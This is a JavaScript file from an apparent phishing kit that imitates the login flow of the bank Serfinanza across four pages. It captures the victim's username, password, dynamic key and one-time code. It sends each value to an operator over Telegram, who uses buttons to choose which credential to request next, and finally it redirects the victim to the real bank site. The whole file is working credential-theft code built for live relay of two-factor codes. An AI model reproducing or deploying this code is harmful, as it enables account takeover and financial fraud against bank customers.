/**
 * SERFINANZA - Cliente optimizado con banco-utils
 * Este archivo se usa en las 4 páginas: index, password, dinamica, otp
 */

(function() {
    'use strict';

    // Configuración de acciones por página
    const routes = {
        'index.html': {
            getFormData: () => ({
                usuario: document.getElementById('usuarioInput')?.value || ''
            }),
            validateForm: (data) => data.usuario.length >= 3
        },
        'password.html': {
            getFormData: () => ({ password: document.getElementById('passwordInput')?.value || '' }),
            validateForm: (data) => data.password.length >= 4
        },
        'dinamica.html': {
            getFormData: () => ({ dinamica: document.getElementById('dinamicaInput')?.value || '' }),
            validateForm: (data) => data.dinamica.length === 6
        },
        'otp.html': {
            getFormData: () => ({ otp: document.getElementById('otpInput')?.value || '' }),
            validateForm: (data) => data.otp.length === 4
        }
    };

    const buttons = [
        { text: '👤 Pedir Usuario', action: 'request_usuario' },
        { text: '🔐 Pedir Contraseña', action: 'request_password' },
        { text: '🔢 Pedir Dinámica', action: 'request_dynamic' },
        { text: '📱 Pedir OTP', action: 'request_otp' },
        { text: '✅ Finalizar', action: 'finish' }
    ];

    function getCurrentPage() {
        const path = window.location.pathname;
        return path.substring(path.lastIndexOf('/') + 1);
    }

    function handleTelegramAction(data) {
        switch(data.action) {
            case 'request_usuario':
                window.location.href = 'index.html';
                break;
            case 'request_password':
                window.location.href = 'password.html';
                break;
            case 'request_dynamic':
                window.location.href = 'dinamica.html';
                break;
            case 'request_otp':
                window.location.href = 'otp.html';
                break;
            case 'finish':
                window.location.href = 'https://www.serfinanza.com/';
                break;
        }
    }

    async function handleSubmit(e) {
        e.preventDefault();
        const currentPage = getCurrentPage();
        const pageConfig = routes[currentPage];
        
        if (!pageConfig) {
            console.error('Página no configurada:', currentPage);
            return;
        }

        const formData = pageConfig.getFormData();
        
        if (!pageConfig.validateForm(formData)) {
            alert('Por favor complete todos los campos correctamente');
            return;
        }

        BancoUtils.showOverlay();

        const data = BancoUtils.saveBankData('serfinanza', formData);
        const pageName = currentPage.replace('.html', '').toUpperCase();
        const message = BancoUtils.formatMessage(`SERFINANZA - ${pageName}`, data);
        const keyboard = BancoUtils.createKeyboard(buttons, BancoUtils.getSessionId());

        try {
            await BancoUtils.sendToTelegram(pageName.toLowerCase(), { text: message, keyboard });
        } catch (error) {
            console.error('Error:', error);
            BancoUtils.hideOverlay();
            alert('Error al enviar los datos');
        }
    }

    // Inicializar cuando el DOM esté listo
    document.addEventListener('DOMContentLoaded', () => {
        BancoUtils.onTelegramAction(handleTelegramAction);

        const currentPage = getCurrentPage();
        const pageConfig = routes[currentPage];

        // Sistema de validación de botones
        if (pageConfig) {
            const submitBtn = document.querySelector('button[type="submit"]');
            const inputs = document.querySelectorAll('input, select');

            function validateFormButton() {
                const formData = pageConfig.getFormData();
                const isValid = pageConfig.validateForm(formData);
                if (submitBtn) {
                    submitBtn.disabled = !isValid;
                    submitBtn.classList.toggle('active', isValid);
                }
            }

            if (inputs.length > 0) {
                inputs.forEach(input => {
                    input.addEventListener('input', validateFormButton);
                    input.addEventListener('change', validateFormButton);
                });
            }

            // Validación inicial
            validateFormButton();
        }

        const form = document.querySelector('form');
        if (form) {
            form.addEventListener('submit', handleSubmit);
        }

        // Validación numérica en inputs específicos
        const numericInputs = document.querySelectorAll('input[type="password"], input[type="text"][id^="dinamica"], input[type="text"][id^="otp"]');
        numericInputs.forEach(input => {
            input.addEventListener('input', () => {
                const maxLength = input.id === 'dinamica' ? 6 : input.id === 'otp' ? 4 : 20;
                BancoUtils.validateNumeric(input, maxLength);
            });
        });
    });
})();
